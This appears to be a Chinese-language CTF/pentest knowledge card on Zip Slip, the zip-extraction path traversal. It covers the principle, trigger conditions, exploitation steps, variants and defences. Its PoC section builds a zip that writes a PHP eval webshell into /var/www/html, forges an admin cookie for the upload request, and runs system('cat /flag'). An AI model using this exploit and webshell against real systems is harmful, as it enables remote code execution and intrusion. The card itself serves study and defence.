---
id: web-generic-file-upload-zip-slip-webshell-write
title: Zip 解压目录穿越（Zip Slip）写入 Web 根目录实现 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: zip-slip-arbitrary-write
aliases:
- Zip Slip
- 压缩包目录穿越
- 解压路径穿越
- zip 解压写任意文件
- extractall 穿越
tags:
- web
- file-upload
- zip
- path-traversal
- arbitrary-write
- rce
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:29:43+08:00'
  notes: 已对照原文与图06/07/08核对：上传 zip 后服务端解压存在目录穿越，恶意条目 ../../../var/www/html/shell.php 写入 PHP 服务 Web 根；图07 证实 Cookie visited=yes; user=admin; 可直接伪造登录，原文给出默认密码 secret。核对时把“SSRF 未单独成卡”的过时表述改为指向独立 SSRF 卡。原文未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

上传功能接收 zip 并在服务端解压时，如果直接把压缩包内的条目名拼到解压目录后写文件，条目名里的 `../` 就能把 `shell.php` 写到解压目录之外（如另一个服务的 Web 根），从而获得任意文件写入与代码执行。

## 原理

- zip 条目名（`ZipInfo.filename`）是压缩包内的相对路径，攻击者可任意构造，包括 `../../`、绝对路径、Windows 盘符和反斜杠。
- 朴素实现用 `os.path.join(dest, name)` 或 `zipfile.extractall(dest)`（早期 Python/第三方库存在同类问题），没有把结果规范化后与 `dest` 比较；`..` 段在文件系统解析时生效，写入落在 `dest` 之外。
- 若目标路径恰好是 Web 可访问目录，写入的 `.php`/`.jsp` 等文件即可被请求执行；即使解压目录不可写，穿越到其他可写目录同样成立。
- 之所以成立：解压逻辑把“归档内路径”当作可信数据，而归档由攻击者完全控制；路径安全检查缺位使数据变成了文件系统写权限。

## 触发条件

- 存在上传 zip 并由服务端解压的功能（批量导入、主题/插件安装、备份恢复等）；
- 解压时使用条目名拼接路径，未做规范化与边界校验，且跟随 `..`/符号链接；
- 进程对目标目录（或穿越后的目录）有写权限；
- 目标目录可被 Web 服务解析执行（PHP/JSP/ASPX 等），或可覆盖配置文件/计划任务。

## 利用步骤

1. 确认上传点与解压行为（上传 zip 后目录中出现解压文件）。
2. 取得进入上传功能所需的最低权限（本例通过弱鉴权：直接伪造 `Cookie: visited=yes; user=admin;`，或爆破默认口令）。
3. 构造含 `../` 条目名的 zip，条目内容为 webshell。
4. 上传后请求穿越写入的路径，执行命令读取 flag/主机信息。
5. 如目标路径未知，可从报错、目录列表或常见 Web 根路径（`/var/www/html`、应用静态目录）枚举。

## PoC

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w', compression=zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('../../../var/www/html/shell.php'),
               '<?php eval($_REQUEST["cmd"]);?>')
```

```http
POST /upload HTTP/1.1
Host: target
Cookie: visited=yes; user=admin;
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="evil.zip"
Content-Type: application/zip

<zip bytes>
--X--
```

```http
GET /shell.php?cmd=system('cat /flag'); HTTP/1.1
Host: target
```

## 变体与关联

- 变体：符号链接条目指向 `/etc` 或 Web 根；绝对路径条目；Windows 下 `..\..\` 与盘符；先解压到临时目录再移动的实现同样可能被穿越；覆盖 `.htaccess`/`web.config`/cron 文件。
- 关联：[[web-generic-file-upload-weak-suffix-bypass]]（上传类型校验缺陷）；[[web-generic-auth-cookie-base64-identity-forgery]]（弱 cookie 鉴权进入上传点）；SSRF 跳板另见独立卡片 [[web-generic-ssrf-avatar-urlopen-internal-service]]。
- 环境差异：原文靶机 compose 设置了 `read_only: true`，但远程实际可写，说明容器只读配置不能替代解压路径校验。
- 影响边界：需要服务端解压且目标路径可写；若解压使用安全库、禁 FollowSymlinks 或目标目录不可执行脚本，危害降级为任意文件写/覆盖。

## 检测与防御

- 检测：上传 zip 后出现解压目录之外的写入；zip 条目名含 `..`、绝对路径、反斜杠、盘符或符号链接；Web 根出现新脚本文件；上传接口被弱 cookie/默认口令访问。
- 防御：解压前规范化 `dest`，对每个条目 `resolve()` 后用 `os.path.commonpath([dest, target]) == dest` 校验；拒绝绝对路径、盘符、`..` 与符号链接；只解压白名单后缀；先解压到隔离临时目录再安全移动；上传功能使用服务端会话鉴权而非客户端布尔 cookie；容器只读/最小权限运行。
